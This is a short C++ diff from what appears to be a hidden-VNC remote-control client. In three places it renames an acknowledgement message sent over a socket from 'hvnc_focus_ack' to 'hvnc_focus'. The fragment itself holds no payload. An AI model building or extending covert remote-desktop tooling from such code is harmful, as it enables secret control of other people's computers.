@@ -1170,7 +1170,7 @@ static void input_loop() {
 
             if (hwnd) {
                 json ack;
-                ack["action"] = "hvnc_focus_ack";
+                ack["action"] = "hvnc_focus";
                 ack["hwnd"] = to_string((uintptr_t)hwnd);
                 safe_send_json(g_socket, ack);
 
@@ -1239,7 +1239,7 @@ static void input_loop() {
 
             if (hwnd) {
                 json ack;
-                ack["action"] = "hvnc_focus_ack";
+                ack["action"] = "hvnc_focus";
                 ack["hwnd"] = to_string((uintptr_t)hwnd);
                 safe_send_json(g_socket, ack);
 
@@ -1270,7 +1270,7 @@ static void input_loop() {
 
             if (hwnd) {
                 json ack;
-                ack["action"] = "hvnc_focus_ack";
+                ack["action"] = "hvnc_focus";
                 ack["hwnd"] = to_string((uintptr_t)hwnd);
                 safe_send_json(g_socket, ack);
 
